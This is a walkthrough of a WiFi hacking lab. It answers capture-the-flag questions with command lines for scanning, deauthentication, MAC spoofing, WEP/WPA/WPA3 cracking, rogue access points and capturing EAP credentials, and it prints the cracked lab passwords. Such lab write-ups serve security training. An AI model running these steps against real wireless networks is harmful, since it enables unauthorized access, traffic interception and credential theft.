# WiFi Challenge

## Recon

### What is the channel that the wifi-global Access Point is currently using?

Start a monitoring interface

```
sudo airmon-ng start wlan0mon
```

and scan for the APs

```
sudo airodump-ng wlan0mon -b a
```

<figure><img src="../.gitbook/assets/immagine (3).png" alt=""><figcaption></figcaption></figure>

### What is the MAC of the wifi-IT client?

Wifi-IT channel is 11 so we need to find client on the channel 11

```
sudo airodump-ng wlan0mon -c 11
```

<figure><img src="../.gitbook/assets/immagine (4).png" alt=""><figcaption></figcaption></figure>

### What is the probe of 78:C1:A7:BF:72:46?

```
sudo airodump-ng wlan0mon 
```

### What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?

```bash
cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
```

Once we have the modified dictionary we can use “mdk4” to launch probes with each of the ESSIDs until the AP responds.

```bash
airmon-ng start wlan0 
iwconfig wlan0mon channel 11
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
```

## OPN

### What is the flag in the hidden AP router behind default credentials?

Once we know your ESSID we can connect to the network, for that we create a “free.conf’ file to connect from bash using “wpa\_supplicant”.

```bash
network={
	ssid="$ESSID"
	key_mgmt=NONE
	scan_ssid=1
}
```

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```

In another terminal as root:

```bash
dhclient wlan2 -v
```

Once connected to the network and get IP with “dhclient” we can access the IP at IP 192.168.16.1 where we see a login where we can test default credentials such as admin/admin, accessing the admin panel where you can find the flag.

### What is the flag on the AP router of the wifi-guest network?

For this challenge we have to access the wifi-guest network and bypass the captive portal. We can connect with the same method as in the previous challenge, but when we try to access the AP we find a captive portal that asks us for credentials. The AP is in the channel 6, so can monitor it first.

To bypass this login we can use the MAC of a client connected to that network that we see with traffic, for that we can use airodump-ng again and impersonate one of those MAC.

```bash
systemctl stop network-manager
ip link set wlan2 down
macchanger -m b0:72:bf:44:b0:49 wlan2
ip link set wlan2 up
```

next we can connect again

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
```

```bash
sudo dhclient -v wlan2
```

<figure><img src="../.gitbook/assets/openlogin.png" alt=""><figcaption></figcaption></figure>

To obtain the login credentials we make a capture of “airodump-ng” saving the output with “-w” and after a while (3–5 min approx) we can see HTTP requests in the “.cap” file with “wireshark” in which there is a POST with username and password.

## WEP

### What is the flag on the wifi-old AP website?

Start by launching airdump on th wifi

```
sudo airodump-ng -c 3 -w old --essid wifi-old --bssid F0:9F:C2:71:22:11 wlan0mon
```

<figure><img src="../.gitbook/assets/immagine (7).png" alt=""><figcaption></figcaption></figure>

and then launch arp attack with airplay

```
sudo aireplay-ng -3 -b F0:9F:C2:71:22:11 -h CE:62:DE:B1:FC:73 wlan0mon
```

now you can use aircrack to crack the password

```
aircrack-ng old-02.cap
```

<figure><img src="../.gitbook/assets/immagine (8).png" alt=""><figcaption></figcaption></figure>

Once we have the password we can connect to the WEP network:

Create a configuration file to connect to the WEP network.

```bash
nano wep.conf
```

The content should look like this.

```bash
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11bb33cd55
  wep_tx_keyidx=0
}
```

Now we can connect to the WEP network with our configuration file.

```bash
wpa_supplicant -D nl80211 -i wlan2 -c wep.conf
```

We should try to retrieve an IP address from the DHCP server.

```bash
dhclient wlan2 -v
```

## PSK

### What is the wifi-mobile AP password?

For this challenge we have to obtain the password of a normal PSK network, for this we have to monitor the traffic with “airodump-ng” and wait for a client to connect or force a deauth attack with “aireplay-ng”.

```bash
airodump-ng -c 6 -w mobile --essid wifi-mobile --bssid F0:9F:C2:71:22:12 wlan0mon
```

In parallel

```bash
aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
```

and then crackit&#x20;

```
aircrack-ng -w rockyou-top100000.txt mobile-01.cap
```

<figure><img src="../.gitbook/assets/immagine (9).png" alt=""><figcaption></figcaption></figure>

### What is the IP of the web server in the wifi-mobile network?

If we have a handshake and the network password, we can decrypt the traffic of each of the users after the handshake, making it very similar to the open networks in the previous section.

For this we can use “airdecap-ng” and then open the generated file with “Wireshark” to obtain the IP of the HTTP server.

```bash
airdecap-ng -e wifi-mobile -p starwars1 mobile-01.cap
```

then open the decrypted file with wireshark. get the cookie **PHPSESSID=u7bbth00ot6na3uinle9ll2i2a**

### what is the flag after login in wifi-mobile?

The first thing we have to do is to connect to the network, for that we can use “wpa\_supplicant” again, with the following configuration file mobile.conf

```bash
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

```bash
wpa_supplicant -Dnl80211 -iwlan3 -c mobile.conf
```

```bash
dhclient wlan3 -v
```

inject the cookie in the website

### Is there client isolation in the wifi-mobile network?

To do this we can use “arp-scan” to get the IPs and curl their HTTP server to get the flag.

```bash
arp-scan -I wlan3 -l
curl 192.168.2.7
```

### What is the wifi-offices password?

The wifi-offices network is not visible, so it is in another location or maybe it is no longer there, but we can still get its password by creating a fake AP with “hostapd-mana” and get the handshake of the clients that ask for this network in their Probes to perform a dictionary attack against it and get the password in clear text.

hostapd.conf

```bash
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
hostapd-mana hostapd.conf
```

<figure><img src="../.gitbook/assets/hostapd-mana.png" alt=""><figcaption></figcaption></figure>

Once we have obtained the handshake we can crack it using “hashcat”. Clear the hash and use it

```bash
hashcat -a 0 -m 22000 hostapd.hccapx ~/rockyou-top100000.txt --force
```

## SAE

### What is the flag on the wifi-management AP website?

In WPA3 networks it is still possible to brute force until the password is found, to do this we can use “wacker”.

[https://github.com/blunderbuss-wctf/wacker](https://github.com/blunderbuss-wctf/wacker)

{% code overflow="wrap" %}
```bash
./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
```
{% endcode %}

![wacker](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/wacker.png#center)

### What is the flag on the wifi-IT AP website?

If a network with WPA3 SAE has a client configured for WPA2/WPA3 we can perform a downgrade against the client forcing it to connect to our RogueAP with WPA2 obtaining the handshake to crack it later, as in the case of wifi-offices. In this case we can see that the AP uses SAE and PSK, so maybe the clients accept PSK too. We can get this information in the airodump-ng “.csv” file.

![sae](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/sae.png#center)

hostapd-sae.conf

```bash
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
hostapd-mana hostapd-sae.conf
```

We can check if the AP has MFP(802.11w) with Wireshark:

![wireshark-mfp](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/wireshark-mfp.png#center)

In this case 802.11w is disabled so we can deauth:

```bash
# In this case 802.11w is disabled so we can deauth
iwconfig wlan0mon channel 11
aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52
```

![mana-sae](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/mana-sae.png#center)

```bash
hashcat -a 0 -m 2500 hostapd-management.hccapx ~/rockyou-top100000.txt --force
```

![hashcat-it](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/hashcat-it.png#center)

## Recon MGT

### What is the domain of the users of the wifi-regional network?

In MGT networks misconfigured users can send their Identity (username) in clear text before performing the TLS tunnel, so with “airodump-ng” we can passively obtain this information. For this we simply use “airodump-ng” on the correct channel and wait for the clients to connect.

```bash
airodump-ng wlan0mon -w ~/wifi/scanc44 -c 44 --wps
```

then use wireshark to find a username

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### What is the email address of the servers certificate?

In Wireshark, just filter by certificates using the AP BBSID as filter (in this case any).

```bash
(wlan.sa == f0:9f:c2:71:22:15) && (tls.handshake.certificate)
```

### What is the EAP method supported by the wifi-global AP?

In Wireshark, just filter by certificates using the AP BBSID as filter (in this case any).

```bash
(wlan.sa == f0:9f:c2:71:22:17) && (tls.handshake.certificate)
```

## MGT

To attack a mistrusted client on an MGT network we have to create a RogueAP with the same ESSID and configuration but with a self-signed certificate.

After putting our **wlan0** interface in monitor mode, we now have an interface called **wlan0mon**. We will identify the channel of the target AP and gather its ESSID and BSSID.

Use Wireshark to search for the certificate.

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

For each certificate, we right click and select _Export Packet Bytes_ to save the data into a file with a .der extension.

As a root user, we'll need to navigate to /etc/freeradius/3.0/certs and change the settings of ca.cnf. We edit the **\[certificate\_authority]** fields to match our target CA certificate to appear less suspicious to clients in case they inspect the certificate.

To create the certificates

```
make
```

We make the same attack against the MAC 10:F9:6F:07:6C:40

```bash
iwconfig wlan0mon channel 44
aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40
```

in parallel

```bash
airmon-ng start wlan1
iwconfig wlan1mon channel 44
aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan1mon -c 64:32:A8:07:6C:40
```

![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/TAFSTeZHI115sNtswQKaGg.png#center)

Once connected we get your MSCHAPv2 credentials so we need to crack the hash to get the password in clear text. For this we use “hashcat”.

```bash
hashcat -a 0 -m 5500 hash ~/rockyou-top100000.txt --force
```

juan.tr:bulldogs1234\
